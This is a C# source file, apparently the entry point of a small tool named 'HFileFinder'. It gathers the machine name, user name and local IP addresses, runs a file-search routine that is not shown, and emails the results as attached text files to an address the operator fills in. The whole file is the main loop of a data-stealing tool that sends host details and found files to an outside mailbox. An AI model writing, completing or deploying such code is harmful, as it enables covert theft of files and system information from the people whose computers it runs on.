using System;
using System.Net;

namespace HFileFinder
{
    class Program
    {
        private static string email = "email";//Enter yours
        private static string password = "password";//Enter yours
        private static string displayName = "HFileFinder";
        private static string to = "to";//Enter yours
        private static string subject = Environment.MachineName + "/" + Environment.UserName + " : ";
        private static string body = "";

        static void Main(string[] args)
        {
            //Get IP addresses
            var ips = (Dns.GetHostEntry(Dns.GetHostName()).AddressList);
            foreach (var ip in ips)
            {
                body += (ip.ToString()) + "\n";
            }

            //Main work
            FileFinder.Main();

            //Send datas by email service
            int filesCount = FileFinder.path.Length;
            string[] files = new string[filesCount];
            for (int i = 0; i < filesCount; i++)
            {
                files[i] = i + ".txt";
            }
            Send.SendEmail(email, password, displayName, to, subject, body, files);
        }
    }
}
